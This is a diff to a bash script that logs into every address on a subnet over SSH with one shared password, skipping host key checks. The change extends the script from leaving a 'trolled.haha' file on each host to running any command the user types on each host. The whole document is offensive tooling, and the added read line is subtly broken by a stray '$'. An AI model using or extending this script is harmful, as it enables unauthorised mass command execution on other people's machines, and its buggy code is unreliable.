@@ -14,7 +14,8 @@ function checkOption(){
                         read -p 'Username: ' USERNAME
                         read -p 'Password: ' PASSWORD
                         read -p 'Subnet address (Example: 192.168.1): ' IP
-                        troll $USERNAME $PASSWORD $IP
+                        read -p 'Command to execute: ' $COMMAND
+                        troll $USERNAME $PASSWORD $IP $COMMAND
                         ;;
                 99)
                         exit
@@ -52,7 +53,7 @@ function troll(){
         SECONDS=0
         for COUNTER in $(seq 2 254); do
                 echo "[*] Attacking ${USER}@${SUBNET}.${COUNTER}"
-                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${SUBNET}.${COUNTER} 'touch ~/trolled.haha' 2>/dev/null &
+                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${SUBNET}.${COUNTER} "touch ~/trolled.haha; $COMMAND" 2>/dev/null &
         done
         echo '[*] Attack done'
         ELAPSED_TIME="[*] Elapsed time: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
